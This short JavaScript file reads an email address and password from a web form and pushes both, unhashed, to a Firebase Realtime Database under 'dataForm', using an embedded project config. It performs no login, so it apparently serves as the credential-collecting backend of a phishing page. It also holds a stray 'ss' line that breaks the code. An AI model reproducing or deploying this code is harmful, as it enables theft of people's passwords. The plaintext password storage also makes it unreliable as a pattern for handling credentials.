const firebaseConfig = {
  //firebaseကကူးလာတဲ့ဟာထည့်
 apiKey: "AIzaSyChGBZGU93L3Sjs-ZG5JXTD7Et510jsEo8",

  authDomain: "cltwo-29cb0.firebaseapp.com",

  databaseURL: "https://cltwo-29cb0-default-rtdb.firebaseio.com",

  projectId: "cltwo-29cb0",

  storageBucket: "cltwo-29cb0.appspot.com",

  messagingSenderId: "702668190726",

  appId: "1:702668190726:web:7c4fa5997878461a013f87",

  measurementId: "G-89Y0TDQKE8"

};
firebase.initializeApp(firebaseConfig);

// reference your database
var dataFormDB = firebase.database().ref("dataForm");

document.getElementById("dataForm").addEventListener("submit", submitForm);

function submitForm(a) {
  a.preventDefault();

  var email = getElementVal("email");
  var pass = getElementVal("pass");
 
  saveMessages(email,pass);
  ss

  //   reset the form
  document.getElementById("dataForm").reset();
}

const saveMessages = (email, pass) => {
  var newDataForm = dataFormDB.push();

  newDataForm.set({
    user_email : "Email "+email,
   user_pass : pass,

  });
};

const getElementVal = (id) => {
  return document.getElementById(id).value;
};
